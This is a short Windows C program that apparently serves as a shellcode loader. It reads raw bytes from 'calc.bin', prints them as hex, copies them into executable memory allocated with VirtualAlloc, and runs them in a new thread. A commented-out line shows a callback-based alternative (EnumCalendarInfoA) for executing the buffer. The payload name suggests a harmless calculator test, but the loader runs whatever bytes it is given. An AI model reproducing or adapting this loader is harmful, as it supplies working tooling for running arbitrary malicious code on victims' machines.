#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>


int main(){
    FILE *file;
    char *buffer;
    int fileLen;

    file = fopen("calc.bin", "rb");

    fseek(file, 0, SEEK_END);
    fileLen = ftell(file);
    fseek(file, 0, SEEK_SET);

    buffer = (char *)malloc(fileLen + 1);

    fread(buffer, fileLen, 1, file);
    fclose(file);

    buffer[fileLen] = '\0';
    printf("File contents:\n");
    for (int i = 0; i < fileLen+1; i++) {
        printf("%x ", (unsigned char)buffer[i]);
    }
    printf("\n");
    void *exec = VirtualAlloc(0, fileLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, fileLen);
	HANDLE foo = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)exec,NULL,0,NULL);
    WaitForSingleObject(foo,INFINITE);
    //EnumCalendarInfoA(exec, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
    
    return 0;
}